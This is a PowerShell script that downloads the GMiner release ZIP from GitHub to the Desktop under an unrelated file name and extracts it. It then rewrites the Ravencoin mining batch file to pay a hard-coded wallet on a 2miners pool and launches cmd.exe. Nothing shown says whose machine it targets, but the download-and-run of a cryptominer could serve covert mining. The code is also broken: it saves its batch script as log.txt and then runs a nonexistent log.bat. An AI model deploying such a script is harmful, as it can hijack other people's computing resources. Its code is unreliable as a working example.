$desktopPath = Join-Path -Path $env:USERPROFILE -ChildPath 'Desktop'

# Set the URL to download the ZIP file
$zipUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.41/gminer_3_41_windows64.zip"

# Set the path where you want to save the downloaded ZIP file on the Desktop
$downloadedZipPath = Join-Path -Path $desktopPath -ChildPath 'cmdMD23111891.zip'

# Set the destination path for extracting the contents of the ZIP file on the Desktop
$destinationPath = $desktopPath

# Set the path for the log file on the Desktop
$logFilePath = Join-Path -Path $desktopPath -ChildPath 'log.txt'

# Batch script code to log terminal output to log.txt
$batchScript = @'
@echo off
echo Logging terminal output to log.txt

(
  echo Starting the batch script...
  
  REM Your main command here
  miner.exe --algo kawpow --server rvn.2miners.com:6060 --user RH2swPipTDBBNxEBdzWuNa4roBu6kFzoT

  echo Batch script completed.
) >> log.txt 2>&1

pause
'@

# Download the ZIP file
Invoke-WebRequest -Uri $zipUrl -OutFile $downloadedZipPath

# Check if the download was successful
if (Test-Path $downloadedZipPath) {
    # Extract the contents of the ZIP file
    Expand-Archive -Path $downloadedZipPath -DestinationPath $destinationPath -Force

    # # Specify the files you want to keep
    # $filesToKeep = @('mine_ravencoin.bat', 'miner.exe', 'miner.exe.sig', 'public.gpg')

    # # Delete files that are not in the $filesToKeep array
    # Get-ChildItem -File | Where-Object { $_.Name -notin $filesToKeep } | Remove-Item -Force

    # Modify the contents of mine_ravencoin.bat
    $newContent = "miner.exe --algo kawpow --server us-rvn.2miners.com:6060 --intensity 50 --user RY3GhiW9KVLYqhvqDGuXoi7EZ78oFMqRsU"
    Set-Content -Path .\mine_ravencoin.bat -Value $newContent -Force

    # Run the batch script to log terminal output
    Set-Content -Path $logFilePath -Value $batchScript -Force
    Start-Process -FilePath "cmd.exe" -ArgumentList "/C .\log.bat" -WorkingDirectory $destinationPath
}
else {
    Write-Host "Download failed. ZIP file not found: $downloadedZipPath"
}
